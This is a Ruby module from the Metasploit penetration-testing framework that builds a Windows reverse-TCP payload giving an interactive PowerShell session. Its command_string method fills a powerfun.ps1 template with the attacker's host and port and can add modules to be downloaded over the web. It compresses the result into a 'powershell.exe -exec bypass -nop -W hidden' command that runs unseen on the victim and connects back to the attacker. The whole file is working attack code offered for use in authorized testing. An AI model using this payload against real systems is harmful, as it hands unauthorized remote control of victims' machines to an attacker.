##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/payload/windows/exec'

###
#
# Extends the Exec payload to add a new user.
#
###
module Metasploit3

  CachedSize = 443

  include Msf::Payload::Windows::Exec
  include Rex::Powershell::Command

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Windows Interactive Powershell Session, Reverse TCP',
      'Description'   => 'Listen for a connection and spawn an interactive powershell session',
      'Author'        =>
        [
          'Ben Turner', # benpturner
          'Dave Hardy' # davehardy20
        ],
      'References'    =>
        [
          ['URL', 'https://www.nettitude.co.uk/interactive-powershell-session-via-metasploit/']
        ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_X86,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Session'       => Msf::Sessions::PowerShell,
      ))

    # Register command execution options
    register_options(
      [
        OptString.new('LOAD_MODULES', [ false, "A list of powershell modules seperated by a comma to download over the web", nil ]),
      ], self.class)
    # Hide the CMD option...this is kinda ugly
    deregister_options('CMD')
  end

  #
  # Override the exec command string
  #
  def command_string
    lport = datastore['LPORT']
    lhost = datastore['LHOST']

    template_path = File.join(
    Msf::Config.data_directory,
    'exploits',
    'powershell',
    'powerfun.ps1')

    script_in = File.read(template_path)
    script_in << "\npowerfun -Command reverse"

    mods = ''

    if datastore['LOAD_MODULES']
      mods_array = datastore['LOAD_MODULES'].to_s.split(',')
      mods_array.collect(&:strip)
      print_status("Loading #{mods_array.count} modules into the interactive PowerShell session")
      mods_array.each {|m| vprint_good " #{m}"}
      mods = "\"#{mods_array.join("\",\n\"")}\""
      script_in << " -Download true\n"
    end

    script_in.gsub!('MODULES_REPLACE', mods)
    script_in.gsub!('LPORT_REPLACE', lport.to_s)
    script_in.gsub!('LHOST_REPLACE', lhost.to_s)
    # Base64 encode the compressed file contents
    script = Rex::Powershell::Command.compress_script(script_in)
    "powershell.exe -exec bypass -nop -W hidden -noninteractive IEX $(#{script})"

  end
end

